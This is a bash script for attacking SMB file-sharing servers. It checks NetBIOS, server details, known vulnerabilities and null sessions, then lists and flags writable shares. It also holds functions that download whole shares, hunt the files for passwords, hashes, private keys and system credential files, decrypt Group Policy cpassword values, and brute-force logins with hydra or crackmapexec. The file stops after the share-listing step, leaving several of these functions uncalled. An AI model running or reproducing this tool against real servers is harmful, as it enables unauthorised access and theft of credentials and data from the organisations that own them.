#!/usr/bin/env bash
# ================================================================
#  smb_enum.sh — SMB Enumeration Tool  |  by Debug
#  Usage: ./smb_enum.sh <IP> [port]
# ================================================================

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[0;33m'
BLU='\033[0;94m'; CYN='\033[0;36m'; WHT='\033[1;37m'
DIM='\033[2m';    RST='\033[0m';    BLD='\033[1m'

[[ -z "$1" ]] && { echo -e "${RED}Usage: $0 <IP> [port]${RST}"; exit 1; }
TARGET="$1"
OUTDIR="smb_results"; mkdir -p "$OUTDIR"
TS=$(date +"%Y%m%d_%H%M%S")
OUTFILE="${OUTDIR}/smb_${TARGET//./_}_${TS}.txt"
DL_DIR="${OUTDIR}/files_${TARGET//./_}_${TS}"

hdr()   { echo -e "\n${BLU}${BLD}┌─────────────────────────────────────────────────────┐${RST}"
          echo -e "${BLU}${BLD}│${RST}  ${YLW}${BLD}$1${RST}"
          echo -e "${BLU}${BLD}└─────────────────────────────────────────────────────┘${RST}"
          printf '\n=== %s ===\n' "$1" >> "$OUTFILE"; }
item()  { echo -e "  ${GRN}✔${RST}  ${WHT}$1${RST}  ${DIM}$2${RST}"; printf '  [+] %s  %s\n' "$1" "$2" >> "$OUTFILE"; }
warn()  { echo -e "  ${YLW}⚠${RST}  $1"; printf '  [!] %s\n' "$1" >> "$OUTFILE"; }
found() { echo -e "  ${RED}${BLD}!!${RST} ${RED}$1${RST}"; printf '  [VULN] %s\n' "$1" >> "$OUTFILE"; }
miss()  { echo -e "  ${DIM}✗  $1${RST}"; printf '  [-] %s\n' "$1" >> "$OUTFILE"; }
inf()   { echo -e "  ${CYN}»${RST}  $1"; printf '  [*] %s\n' "$1" >> "$OUTFILE"; }

# strip ANSI + smbmap noise
_strip() {
    sed $'s/\033\[[0-9;]*m//g' \
    | grep -vE 'SMBMap|Samba Share Enum|ShawnDEvans|github\.com|\[[\\/\|\-]\]|\[\*\] (Detect|Establ|Closed|Initiali|Closing)|\[!\]'
}

# globals
SMB_USER=""; SMB_PASS=""; AUTH_OK=0; NULL_OK=0
CRED_HIT=0; SENS=0; TOTAL_FILES=0
FOUND_USERS=(); FOUND_COMPUTERS=()
WL_USER=""; WL_PASS=""; SMB_PORT=445
declare -A SHARE_COMMENTS; declare -A SHARE_PATHS
SHARES=()

# ---- port detection ----
_port_open() {
    if command -v nc &>/dev/null; then
        nc -z -w2 "$TARGET" "$1" 2>/dev/null
    elif command -v nmap &>/dev/null; then
        nmap -p "$1" --open -T4 "$TARGET" 2>/dev/null | grep -q "open"
    else
        (echo >/dev/tcp/"$TARGET"/"$1") 2>/dev/null
    fi
}

if [[ -n "$2" ]]; then
    SMB_PORT="$2"
else
    _port_open 445 && SMB_PORT=445 || { _port_open 139 && SMB_PORT=139; }
fi

# ---- wrappers ----
_rpc() {
    local port_arg=""
    [[ "$SMB_PORT" != "445" ]] && port_arg="-p $SMB_PORT"
    if [[ -n "$SMB_USER" ]]; then
        rpcclient -U "${SMB_USER}%${SMB_PASS}" $port_arg "$TARGET" -c "$1" 2>/dev/null
    else
        rpcclient -N -U "" $port_arg "$TARGET" -c "$1" 2>/dev/null
    fi
}

_smbc_raw() {
    local sh="$1"; shift
    local port_arg=""
    [[ "$SMB_PORT" != "445" ]] && port_arg="-p $SMB_PORT"
    if [[ -n "$SMB_USER" ]]; then
        smbclient "//${TARGET}/${sh}" -U "${SMB_USER}%${SMB_PASS}" $port_arg "$@" 2>/dev/null
    else
        smbclient "//${TARGET}/${sh}" -N $port_arg "$@" 2>/dev/null
    fi
}
_smbc() { _smbc_raw "$@"; }

CME_BIN=""
for _b in nxc crackmapexec; do command -v "$_b" &>/dev/null && CME_BIN="$_b" && break; done
_cme() {
    [[ -z "$CME_BIN" ]] && return 1
    if [[ -n "$SMB_USER" ]]; then
        $CME_BIN smb "$TARGET" -u "$SMB_USER" -p "$SMB_PASS" "$@" 2>/dev/null | tr -d '\0'
    else
        $CME_BIN smb "$TARGET" -u '' -p '' "$@" 2>/dev/null | tr -d '\0'
    fi
}

_smbmap() {
    local args=()
    [[ -n "$SMB_USER" ]] && args+=(-u "$SMB_USER" -p "$SMB_PASS")
    [[ "$SMB_PORT" != "445" ]] && args+=(-P "$SMB_PORT")
    smbmap -H "$TARGET" "${args[@]}" "$@" 2>/dev/null | _strip
}

# ---- helpers ----
file_tag() {
    case "${1##*.}" in
        txt|log|cfg|conf|ini|env|properties) echo "${YLW}[CFG]${RST}" ;;
        sh|py|php|asp|jsp|ps1|bat|cmd|rb|pl) echo "${RED}[SCR]${RST}" ;;
        docx|xlsx|pdf|pptx|doc|xls)          echo "${CYN}[DOC]${RST}" ;;
        sql|db|sqlite|mdb)                    echo "${RED}[DB] ${RST}" ;;
        zip|tar|gz|7z|rar|bak|backup)         echo "${YLW}[ARC]${RST}" ;;
        key|pem|crt|pfx|p12|ppk)              echo "${RED}[KEY]${RST}" ;;
        xml|json|yml|yaml|toml)               echo "${CYN}[CFG]${RST}" ;;
        *)                                     echo "${DIM}[   ]${RST}" ;;
    esac
}

test_write_share() {
    local SH="$1"
    local TMP; TMP=$(mktemp /tmp/.smb_XXXX)
    echo "smb_enum_write_test" > "$TMP"
    local FNAME=".smb_test_$(date +%s)"
    local RES; RES=$(_smbc_raw "$SH" -c "put ${TMP} ${FNAME}" 2>&1)
    rm -f "$TMP"
    if echo "$RES" | grep -qi "putting"; then
        _smbc_raw "$SH" -c "del ${FNAME}" >/dev/null 2>&1
        return 0
    fi
    return 1
}

download_share() {
    local sh="$1" sd="${DL_DIR}/$1"
    mkdir -p "$sd"; DL_COUNT=0
    if command -v smbclient &>/dev/null; then
        local op="$PWD"; cd "$sd"
        _smbc "$sh" -c "prompt OFF; recurse ON; mget *" >/dev/null 2>&1 || true
        cd "$op"
    fi
    DL_COUNT=$(find "$sd" -type f 2>/dev/null | wc -l)
    if [[ $DL_COUNT -eq 0 ]] && [[ -n "$CME_BIN" ]]; then
        local fs; fs=$(_cme --spider "$sh" --pattern "." 2>/dev/null \
            | grep -oP '[^\\/\[\] ]+\.[a-zA-Z0-9]+$' | sort -u)
        while IFS= read -r fn; do
            [[ -z "$fn" ]] && continue
            _smbc "$sh" -c "get \"${fn}\" \"${sd}/${fn}\"" >/dev/null 2>&1 || true
        done <<< "$fs"
        DL_COUNT=$(find "$sd" -type f 2>/dev/null | wc -l)
    fi
}

hunt_file() {
    local file="$1" rel="${1#${DL_DIR}/}"
    local m
    m=$(grep -aP \
        '(?i)(password\s*[=:]\s*\S|passwd\s*[=:]\s*\S|secret\s*[=:]\s*\S|pwd\s*[=:]\s*\S|api[_-]?key\s*[=:]\s*\S|token\s*[=:]\s*\S|db_pass\s*[=:]\s*\S|admin_pass\s*[=:]\s*\S)' \
        "$file" 2>/dev/null | grep -viE 'example|TODO|PLACEHOLDER' | head -10)
    if [[ -n "$m" ]]; then
        CRED_HIT=$((CRED_HIT+1))
        echo -e "\n  ${RED}${BLD}[CRED]${RST}  ${WHT}${rel}${RST}"
        printf '\n  [CRED] %s\n' "$rel" >> "$OUTFILE"
        while IFS= read -r ln; do
            local no val
            no=$(echo "$ln" | cut -d: -f1)
            val=$(echo "$ln" | cut -d: -f2- | sed 's/^\s*//' | cut -c1-130)
            echo -e "    ${YLW}L${no}${RST}  ${val}"; printf '    L%s: %s\n' "$no" "$val" >> "$OUTFILE"
        done <<< "$m"
    fi
    m=$(grep -aP '(?i)(username\s*[=:]\s*\S|user\s*[=:]\s*\S|login\s*[=:]\s*\S)' \
        "$file" 2>/dev/null | grep -viE 'example|TODO' | head -5)
    if [[ -n "$m" ]]; then
        echo -e "\n  ${CYN}${BLD}[USER]${RST}  ${WHT}${rel}${RST}"
        printf '\n  [USER] %s\n' "$rel" >> "$OUTFILE"
        while IFS= read -r ln; do
            local no val
            no=$(echo "$ln" | cut -d: -f1)
            val=$(echo "$ln" | cut -d: -f2- | sed 's/^\s*//' | cut -c1-100)
            echo -e "    ${CYN}L${no}${RST}  ${val}"; printf '    L%s: %s\n' "$no" "$val" >> "$OUTFILE"
        done <<< "$m"
    fi
    grep -qa "BEGIN.*PRIVATE KEY\|BEGIN RSA\|BEGIN OPENSSH" "$file" 2>/dev/null && {
        CRED_HIT=$((CRED_HIT+1)); found "PRIVATE KEY: ${rel}"
        printf '  [KEY] %s\n' "$rel" >> "$OUTFILE"
    }
    m=$(grep -aoPh '[a-fA-F0-9]{32}(?![a-fA-F0-9])' "$file" 2>/dev/null | sort -u | head -5)
    if [[ -n "$m" ]]; then
        CRED_HIT=$((CRED_HIT+1))
        echo -e "\n  ${RED}${BLD}[NTLM]${RST}  ${WHT}${rel}${RST}"
        printf '\n  [NTLM] %s\n' "$rel" >> "$OUTFILE"
        while IFS= read -r h; do echo -e "    ${YLW}»${RST}  $h"; printf '    %s\n' "$h" >> "$OUTFILE"; done <<< "$m"
    fi
    m=$(grep -aoPh '\$[126yb]\$[A-Za-z0-9./]+\$[A-Za-z0-9./]+' "$file" 2>/dev/null | sort -u | head -5)
    if [[ -n "$m" ]]; then
        CRED_HIT=$((CRED_HIT+1))
        echo -e "\n  ${RED}${BLD}[HASH]${RST}  ${WHT}${rel}${RST}"
        printf '\n  [HASH] %s\n' "$rel" >> "$OUTFILE"
        while IFS= read -r h; do echo -e "    ${YLW}»${RST}  $h"; printf '    %s\n' "$h" >> "$OUTFILE"; done <<< "$m"
    fi
    m=$(grep -aoPh 'cpassword="[^"]+"' "$file" 2>/dev/null | head -5)
    if [[ -n "$m" ]]; then
        CRED_HIT=$((CRED_HIT+1))
        echo -e "\n  ${RED}${BLD}[GPP]${RST}  ${WHT}${rel}${RST}"
        printf '\n  [GPP] %s\n' "$rel" >> "$OUTFILE"
        while IFS= read -r h; do
            echo -e "    ${RED}»${RST}  $h"; printf '    %s\n' "$h" >> "$OUTFILE"
            ENC=$(echo "$h" | grep -oP '(?<=cpassword=")[^"]+')
            if [[ -n "$ENC" ]] && command -v python3 &>/dev/null; then
                DEC=$(python3 - <<PYEOF 2>/dev/null
import base64
try:
    from Crypto.Cipher import AES
    key=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
    enc='${ENC}'; pad=4-len(enc)%4
    if pad!=4: enc+='='*pad
    data=base64.b64decode(enc)
    c=AES.new(key,AES.MODE_CBC,data[:16])
    print(c.decrypt(data[16:]).decode('utf-16-le').rstrip('\x00').strip())
except: pass
PYEOF
                )
                [[ -n "$DEC" ]] && found "GPP DECRYPTED: ${DEC}" && \
                    printf '  [GPP_PLAIN] %s\n' "$DEC" >> "$OUTFILE"
            fi
            GPP_USER=$(grep -aoPh 'userName="[^"]+"' "$file" 2>/dev/null | head -1 | grep -oP '(?<=")[^"]+')
            [[ -n "$GPP_USER" ]] && item "GPP User" "$GPP_USER" && \
                [[ " ${FOUND_USERS[*]} " != *" ${GPP_USER} "* ]] && FOUND_USERS+=("$GPP_USER")
        done <<< "$m"
    fi
    m=$(grep -aoPh '\b10\.\d+\.\d+\.\d+\b|\b192\.168\.\d+\.\d+\b|\b172\.(1[6-9]|2\d|3[01])\.\d+\.\d+\b' \
        "$file" 2>/dev/null | sort -u | head -5)
    [[ -n "$m" ]] && { printf '\n  [IP] %s\n' "$rel" >> "$OUTFILE"
        while IFS= read -r ip; do printf '    %s\n' "$ip" >> "$OUTFILE"; done <<< "$m"; }
}

scan_dir() {
    local sd="$1"
    [[ ! -d "$sd" ]] && return
    [[ $(find "$sd" -type f 2>/dev/null | wc -l) -eq 0 ]] && return
    for pat in "*.key" "*.pem" "*.pfx" "*.ppk" "id_rsa" "id_dsa" "id_ecdsa" \
               "*.sql" "*.db" "*.sqlite" "*.conf" "*.cfg" "*.ini" "*.env" \
               "*.bak" "*.backup" "shadow" "passwd" "htpasswd" "SAM" "SYSTEM" \
               "NTDS.dit" "wp-config.php" "web.config" "*.config" "*.ps1" \
               "unattend.xml" ".bash_history" "Groups.xml" "Scheduledtasks.xml" \
               "Services.xml" "Datasources.xml" "Printers.xml"; do
        while IFS= read -r f; do
            SENS=$((SENS+1)); found "SENSITIVE: ${f#${DL_DIR}/}"
            printf '  [SENS] %s\n' "${f#${DL_DIR}/}" >> "$OUTFILE"
        done < <(find "$sd" -iname "$pat" -type f 2>/dev/null)
    done
    local fa=()
    for e in "*.txt" "*.log" "*.conf" "*.cfg" "*.ini" "*.env" "*.php" "*.py" \
             "*.sh" "*.xml" "*.yml" "*.json" "*.ps1" "*.bat" "*.bak" "*.csv" \
             "*.sql" "*.html" "*.config" "*.properties" ".env" ".bash_history"; do
        fa+=(-o -iname "$e")
    done
    while IFS= read -r file; do
        [[ -z "$file" ]] && continue; hunt_file "$file"
    done < <(find "$sd" \( "${fa[@]:1}" \) -type f 2>/dev/null)
    for sp in passwd shadow SAM SYSTEM htpasswd; do
        while IFS= read -r f; do
            CRED_HIT=$((CRED_HIT+1)); found "SYSTEM FILE: ${f#${DL_DIR}/}"
            grep -av '^#' "$f" 2>/dev/null | grep -av '^$' | head -30 | \
            while IFS= read -r ln; do echo -e "    ${RED}»${RST}  ${ln}"; printf '    %s\n' "$ln" >> "$OUTFILE"; done
        done < <(find "$sd" -name "$sp" -type f 2>/dev/null)
    done
}

ask_wordlist() {
    local DEF_U="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
    local DEF_P="/usr/share/seclists/Passwords/Common-Credentials/best110.txt"
    WL_USER=""; WL_PASS=""; echo ""
    echo -e "  ${DIM}Default user list : ${DEF_U}${RST}"
    read -rp "$(echo -e "      ${YLW}User list [Enter=default / path / n=skip]: ${RST}")" WL_U_IN
    [[ "${WL_U_IN,,}" == "n" ]] && return
    [[ -z "$WL_U_IN" ]] && WL_USER="$DEF_U" || WL_USER="$WL_U_IN"
    echo -e "  ${DIM}Default pass list : ${DEF_P}${RST}"
    read -rp "$(echo -e "      ${YLW}Pass list [Enter=default / path / n=skip]: ${RST}")" WL_P_IN
    [[ "${WL_P_IN,,}" == "n" ]] && WL_USER="" && return
    [[ -z "$WL_P_IN" ]] && WL_PASS="$DEF_P" || WL_PASS="$WL_P_IN"
    [[ ! -f "$WL_USER" ]] && { warn "User list not found: ${WL_USER}"; WL_USER=""; }
    [[ ! -f "$WL_PASS" ]] && { warn "Pass list not found: ${WL_PASS}"; WL_PASS=""; }
}

brute_users() {
    local UTMP; UTMP=$(mktemp /tmp/bf_XXXX)
    for u in "$@"; do echo "$u" >> "$UTMP"; done
    [[ ! -s "$UTMP" ]] && { rm -f "$UTMP"; return; }
    inf "Targets: $(tr '\n' ',' < "$UTMP" | sed 's/,$//')"
    printf '\n--- Brute Force ---\n' >> "$OUTFILE"
    if [[ -n "$CME_BIN" ]]; then
        $CME_BIN smb "$TARGET" -u "$UTMP" -p "$WL_PASS" 2>/dev/null | tr -d '\0' \
            | grep "\[+\]" | grep -av "\[\-\]" | tee -a "$OUTFILE" | \
            while IFS= read -r l; do found "VALID CRED: $l"; done
    fi
    if command -v hydra &>/dev/null; then
        hydra -L "$UTMP" -P "$WL_PASS" "smb://${TARGET}" -t 4 -f 2>/dev/null \
            | grep -a "login:" | tee -a "$OUTFILE" | \
            while IFS= read -r l; do found "VALID CRED: $l"; done
    fi
    rm -f "$UTMP"
}

enum_share_deep() {
    local S="$1" U="$2" P="$3"
    echo -e "\n  ${YLW}${BLD}════  //${TARGET}/${S}  ════${RST}"
    printf '\n  === SHARE: %s ===\n' "$S" >> "$OUTFILE"
    local LST=""
    if command -v smbclient &>/dev/null; then
        if [[ -n "$U" ]]; then
            LST=$(smbclient "//${TARGET}/${S}" -U "${U}%${P}" -c "recurse ON; ls" 2>/dev/null \
                | grep -v "^smb:\|blocks of size\|NT_STATUS\|^$" | tr -d '\r')
        else
            LST=$(smbclient "//${TARGET}/${S}" -N -c "recurse ON; ls" 2>/dev/null \
                | grep -v "^smb:\|blocks of size\|NT_STATUS\|^$" | tr -d '\r')
        fi
    fi
    if [[ -z "$LST" ]]; then
        local sm_r; sm_r=$(_smbmap -R "$S" 2>/dev/null | grep -v "^$")
        [[ -n "$sm_r" ]] && LST="$sm_r"
    fi
    if [[ -n "$LST" ]]; then
        while IFS= read -r entry; do
            [[ -z "$entry" ]] && continue
            local TAG; TAG=$(file_tag "$entry")
            echo -e "    ${TAG}  ${entry}"; printf '    %s\n' "$entry" >> "$OUTFILE"
        done <<< "$LST"
    else
        miss "No listing / access denied: ${S}"
    fi
    local OLD_U="$SMB_USER" OLD_P="$SMB_PASS"
    [[ -n "$U" ]] && SMB_USER="$U" && SMB_PASS="$P"
    download_share "$S"
    SMB_USER="$OLD_U"; SMB_PASS="$OLD_P"
    TOTAL_FILES=$((TOTAL_FILES + DL_COUNT))
    [[ $DL_COUNT -gt 0 ]] && item "Downloaded" "${DL_COUNT} files → ${DL_DIR}/${S}/" \
                           || miss "Nothing downloaded: ${S}"
    [[ $DL_COUNT -gt 0 ]] && { inf "Scanning for credentials..."; scan_dir "${DL_DIR}/${S}"; }
}

share_brute() {
    local WL="$1" BF_FOUND=0
    printf '\n--- Share Brute Force ---\n' >> "$OUTFILE"
    inf "Testing $(wc -l < "$WL") share names..."
    while IFS= read -r SH_NAME; do
        [[ -z "$SH_NAME" ]] && continue
        [[ " ${SHARES[*]} " == *" ${SH_NAME} "* ]] && continue
        local RESULT=""
        if command -v smbclient &>/dev/null; then
            RESULT=$(_smbc_raw "$SH_NAME" -c "ls" 2>&1)
            if echo "$RESULT" | grep -qv "NT_STATUS_BAD_NETWORK_NAME\|NT_STATUS_OBJECT_NAME_NOT_FOUND"; then
                if echo "$RESULT" | grep -qv "NT_STATUS_ACCESS_DENIED\|NT_STATUS_LOGON_FAILURE"; then
                    found "Share EXISTS + READABLE: ${SH_NAME}"
                    printf '  [SHARE_BF] %s  ACCESS=YES\n' "$SH_NAME" >> "$OUTFILE"
                    SHARES+=("${SH_NAME}"); BF_FOUND=$((BF_FOUND+1))
                else
                    warn "Share EXISTS (access denied): ${SH_NAME}"
                    printf '  [SHARE_BF] %s  ACCESS=DENIED\n' "$SH_NAME" >> "$OUTFILE"
                    BF_FOUND=$((BF_FOUND+1))
                fi
            fi
        fi
    done < "$WL"
    echo ""
    [[ $BF_FOUND -gt 0 ]] && item "Found via brute force" "${BF_FOUND} share(s)" \
                           || miss "No shares found via brute force"
}

# ================================================================
clear
echo -e "${BLU}${BLD}"
echo "  ███████╗███╗   ███╗██████╗     ███████╗███╗   ██╗██╗   ██╗███╗   ███╗"
echo "  ██╔════╝████╗ ████║██╔══██╗    ██╔════╝████╗  ██║██║   ██║████╗ ████║"
echo "  ███████╗██╔████╔██║██████╔╝    █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║"
echo "  ╚════██║██║╚██╔╝██║██╔══██╗    ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║"
echo "  ███████║██║ ╚═╝ ██║██████╔╝    ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║"
echo "  ╚══════╝╚═╝     ╚═╝╚═════╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝"
echo -e "${RST}"
echo -e "  ${DIM}Target: ${WHT}${TARGET}:${SMB_PORT}${RST}\n"
{ printf '=== SMB Report  %s:%s  —  %s ===\n\n' "$TARGET" "$SMB_PORT" "$(date)"; } > "$OUTFILE"
[[ "$SMB_PORT" != "445" ]] && warn "Using port ${SMB_PORT} (445 closed)"

# ================================================================
#  0. NETBIOS
# ================================================================
hdr "NetBIOS Enumeration"

NB_NAME=""; NB_MAC=""
if command -v nmblookup &>/dev/null; then
    NB1=$(nmblookup -A "$TARGET" 2>/dev/null)
    if [[ -n "$NB1" ]]; then
        inf "M1 (nmblookup)"; printf '%s\n' "$NB1" >> "$OUTFILE"
        echo "$NB1" | grep -vE '^\s*$|Looking up' | while IFS= read -r l; do echo -e "  ${DIM}${l}${RST}"; done
        NB_NAME=$(echo "$NB1" | grep '<00>' | grep -v GROUP | awk '{print $1}' | head -1)
        NB_MAC=$(echo "$NB1"  | grep -i "MAC" | grep -oP '([0-9a-f]{2}[:-]){5}[0-9a-f]{2}')
        echo "$NB1" | grep -qi "<03>"  && warn "Messenger service — may reveal logged-in users"
        echo "$NB1" | grep -qi "<20>"  && warn "File server service active"
        echo "$NB1" | grep -qi "1e\|1d" && inf "Workgroup/domain browser"
    fi
fi
if command -v nbtscan &>/dev/null; then
    NB2=$(nbtscan -r "$TARGET" 2>/dev/null | grep -v '^\-\|^IP\|Doing')
    [[ -n "$NB2" ]] && { inf "M2 (nbtscan)"
        echo "$NB2" | while IFS= read -r l; do [[ -z "$l" ]] && continue; echo -e "  ${DIM}${l}${RST}"; done
        printf '%s\n' "$NB2" >> "$OUTFILE"; }
fi
if command -v nmap &>/dev/null; then
    NB3=$(nmap -p 137 --script nbstat "$TARGET" 2>/dev/null)
    echo "$NB3" | grep -qi "nbstat\|NetBIOS" && {
        inf "M3 (nmap nbstat)"
        [[ -z "$NB_NAME" ]] && NB_NAME=$(echo "$NB3" | grep "Server name" | sed 's/.*: //')
        printf '%s\n' "$NB3" >> "$OUTFILE"; }
fi
echo ""
[[ -n "$NB_NAME" ]] && item "NetBIOS Name" "$NB_NAME"
[[ -n "$NB_MAC"  ]] && item "MAC Address"  "$NB_MAC"

# ================================================================
#  1. SERVER INFO
# ================================================================
hdr "Server Info"

SRV_NAME=""; SRV_DOMAIN=""; SRV_OS=""; SRV_VER=""; SRV_SIGN=""; SRV_SMB1=""

if [[ -n "$CME_BIN" ]]; then
    CME_B=$($CME_BIN smb "$TARGET" 2>/dev/null | tr -d '\0' | head -3)
    if [[ -n "$CME_B" ]]; then
        SRV_NAME=$(  echo "$CME_B" | grep -oP 'name:\K[^):]+'  | head -1)
        SRV_DOMAIN=$(echo "$CME_B" | grep -oP 'domain:\K[^):]+'| head -1)
        SRV_SIGN=$(  echo "$CME_B" | grep -oP 'signing:\K\w+'  | head -1)
        SRV_VER=$(   echo "$CME_B" | grep -oP 'Windows \K[0-9.]+' | head -1)
        SRV_SMB1=$(  echo "$CME_B" | grep -oP 'SMBv1:\K\w+'    | head -1)
        SRV_OS=$(    echo "$CME_B" | grep -oP '(Unix|Windows)[^(]+' | head -1 | sed 's/[[:space:]]*$//')
        inf "M1 ($CME_BIN)"; printf '%s\n' "$CME_B" >> "$OUTFILE"
    fi
fi
if command -v nmap &>/dev/null; then
    NM_OS=$(nmap -p "$SMB_PORT" --script smb-os-discovery "$TARGET" 2>/dev/null)
    [[ -z "$SRV_NAME"   ]] && SRV_NAME=$(  echo "$NM_OS" | grep -i "Computer name" | sed 's/.*: //')
    [[ -z "$SRV_DOMAIN" ]] && SRV_DOMAIN=$(echo "$NM_OS" | grep -i "Domain:"       | sed 's/.*: //')
    [[ -z "$SRV_OS"     ]] && SRV_OS=$(    echo "$NM_OS" | grep -i "OS:"           | sed 's/.*: //')
    printf '%s\n' "$NM_OS" >> "$OUTFILE"
fi
if command -v rpcclient &>/dev/null; then
    RPC_SRV=$(rpcclient -N -U "" "$TARGET" -c "srvinfo" 2>/dev/null)
    [[ -z "$SRV_NAME" ]] && SRV_NAME=$(echo "$RPC_SRV" | awk 'NR==1{print $1}')
    [[ -z "$SRV_VER"  ]] && SRV_VER=$( echo "$RPC_SRV" | grep -oP 'os version\s*:\s*\K[\d.]+')
    printf '%s\n' "$RPC_SRV" >> "$OUTFILE"
fi

echo ""
[[ -n "$SRV_NAME"   ]] && item "Hostname"    "$SRV_NAME"
[[ -n "$SRV_DOMAIN" ]] && item "Domain / WG" "$SRV_DOMAIN"
[[ -n "$SRV_OS"     ]] && item "OS"          "$SRV_OS"
[[ -n "$SRV_VER"    ]] && item "Version"     "$SRV_VER"

if command -v nmap &>/dev/null; then
    DIAL=$(nmap -p "$SMB_PORT" --script smb-protocols,smb2-capabilities,smb2-security-mode \
           "$TARGET" 2>/dev/null)
    DIALECTS=$(echo "$DIAL" | grep -oP '^\s+\K[0-9]+\.[0-9]+(\.[0-9]+)?' | sort -Vu | tr '\n' '  ')
    [[ -n "$DIALECTS" ]] && item "SMB Dialects" "$DIALECTS"
    printf '%s\n' "$DIAL" >> "$OUTFILE"
    NM_DOM=$(nmap -p "$SMB_PORT" --script smb-enum-domains "$TARGET" 2>/dev/null)
    echo "$NM_DOM" | grep -qi "domain\|password policy" && {
        inf "Domain info (smb-enum-domains):"
        echo "$NM_DOM" | grep -vE "^\|_$|^Start|Nmap scan|Host is up|PORT" | \
        while IFS= read -r l; do [[ -z "$l" ]] && continue; echo -e "  ${DIM}${l}${RST}"; done
        printf '%s\n' "$NM_DOM" >> "$OUTFILE"; }
fi

if [[ "${SRV_SIGN,,}" == "false" ]]; then
    found "Signing DISABLED — NTLM relay attack possible!"
elif [[ -n "$SRV_SIGN" ]]; then
    item "Signing" "enabled"
fi
[[ "${SRV_SMB1,,}" == "true" ]] && found "SMBv1 ENABLED — EternalBlue risk!"

if command -v nmap &>/dev/null; then
    VU=$(nmap -p "$SMB_PORT" \
         --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2017-7494,smb-vuln-ms10-054,smb-vuln-ms10-061 \
         "$TARGET" 2>/dev/null)
    echo "$VU" | grep -qi "VULNERABLE\|ms17-010"      && found "EternalBlue (MS17-010) VULNERABLE!"
    echo "$VU" | grep -qi "ms08-067"                  && found "MS08-067 VULNERABLE!"
    echo "$VU" | grep -qi "cve-2017-7494\|SambaCry"   && found "SambaCry (CVE-2017-7494) VULNERABLE!"
    echo "$VU" | grep -qi "ms10-054"                  && found "MS10-054 (BSoD) VULNERABLE!"
    echo "$VU" | grep -qi "ms10-061"                  && found "MS10-061 (Print Spooler) VULNERABLE!"
    printf '%s\n' "$VU" >> "$OUTFILE"
fi

# ================================================================
#  2. ACCESS
# ================================================================
hdr "Access"

if command -v smbclient &>/dev/null; then
    smbclient -N -L "//${TARGET}" -p "$SMB_PORT" 2>&1 | grep -qiE "Sharename|Anonymous" && \
        NULL_OK=1 && inf "M1: null session (smbclient -N)"
fi
if [[ $NULL_OK -eq 0 ]] && command -v rpcclient &>/dev/null; then
    _rpc "srvinfo" | grep -qi "platform" && NULL_OK=1 && inf "M2: null session (rpcclient)"
fi
if [[ $NULL_OK -eq 0 ]] && [[ -n "$CME_BIN" ]]; then
    _cme | grep -qi "Null Auth:True\|\[+\]" && NULL_OK=1 && inf "M3: null session ($CME_BIN)"
fi

[[ $NULL_OK -eq 1 ]] && found "NULL SESSION — anonymous access!" \
                      || miss "Null session denied"

echo -e "\n  ${CYN}[?]${RST} Enter credentials  (Enter = anonymous):"
read -rp "$(echo -e "      ${YLW}Username: ${RST}")" SMB_USER
read -rsp "$(echo -e "      ${YLW}Password: ${RST}")" SMB_PASS
echo ""

if [[ -n "$SMB_USER" ]]; then
    AUTH_OK=0
    command -v smbclient &>/dev/null && \
        smbclient -L "//${TARGET}" -p "$SMB_PORT" -U "${SMB_USER}%${SMB_PASS}" 2>/dev/null \
            | grep -qiE "Sharename|Disk" && AUTH_OK=1 && inf "M1 (smbclient)"
    [[ $AUTH_OK -eq 0 ]] && [[ -n "$CME_BIN" ]] && \
        _cme | grep -qi "\[+\]" && AUTH_OK=1 && inf "M2 ($CME_BIN)"
    [[ $AUTH_OK -eq 0 ]] && command -v rpcclient &>/dev/null && \
        _rpc "srvinfo" | grep -qi "platform" && AUTH_OK=1 && inf "M3 (rpcclient)"
    if [[ $AUTH_OK -eq 1 ]]; then
        item "Auth OK" "${SMB_USER}@${TARGET}"
    else
        warn "Auth failed — falling back to null"; SMB_USER=""; SMB_PASS=""
    fi
fi
[[ $AUTH_OK -eq 0 && $NULL_OK -eq 1 ]] && AUTH_OK=1
[[ $AUTH_OK -eq 0 ]] && { miss "No access — exiting"; exit 1; }

# ================================================================
#  3. SHARE ENUMERATION
# ================================================================
hdr "Share Enumeration"

SM=""
if command -v smbclient &>/dev/null; then
    if [[ -n "$SMB_USER" ]]; then
        SL=$(smbclient -L "//${TARGET}" -p "$SMB_PORT" -U "${SMB_USER}%${SMB_PASS}" 2>/dev/null)
    else
        SL=$(smbclient -N -L "//${TARGET}" -p "$SMB_PORT" 2>/dev/null)
    fi
    echo "$SL" | grep -E "Sharename|Disk|IPC|Type|---" | while IFS= read -r l; do
        echo -e "  ${DIM}${l}${RST}"; printf '  %s\n' "$l" >> "$OUTFILE"
    done
    while IFS= read -r line; do
        SN=$(echo "$line" | awk '{print $1}')
        ST=$(echo "$line" | awk '{print $2}')
        SC=$(echo "$line" | awk '{$1=$2=""; print $0}' | sed 's/^\s*//')
        [[ "$ST" == "Disk" ]] && SHARES+=("$SN") && SHARE_COMMENTS["$SN"]="$SC"
    done < <(echo "$SL" | awk '/Sharename/{f=1;next} f && /Disk/{print}')
fi

SM=$(_smbmap)
if [[ -n "$SM" ]]; then
    echo ""
    echo "$SM" | grep -vE '^\s*$' | while IFS= read -r l; do echo -e "  ${DIM}${l}${RST}"; done
    printf '%s\n' "$SM" >> "$OUTFILE"
    echo "$SM" | grep -iE "READ, WRITE|READ,WRITE" | while IFS= read -r l; do
        found "WRITABLE: $(echo "$l" | awk '{print $1}')"
    done
    [[ ${#SHARES[@]} -eq 0 ]] && mapfile -t SHARES < <(echo "$SM" | awk '/Disk/{print $1}')
fi

if command -v nmap &>/dev/null; then
    NM_SH=$(nmap -p "$SMB_PORT" --script smb-enum-shares "$TARGET" 2>/dev/null)
    echo "$NM_SH" | grep -qi "Access\|Sharename" && {
        inf "nmap smb-enum-shares:"
        echo "$NM_SH" | grep -vE "^\|_$|^Start|Nmap scan|Host is up|PORT" | \
        while IFS= read -r l; do [[ -z "$l" ]] && continue; echo -e "  ${DIM}${l}${RST}"; done
        printf '%s\n' "$NM_SH" >> "$OUTFILE"; }
fi

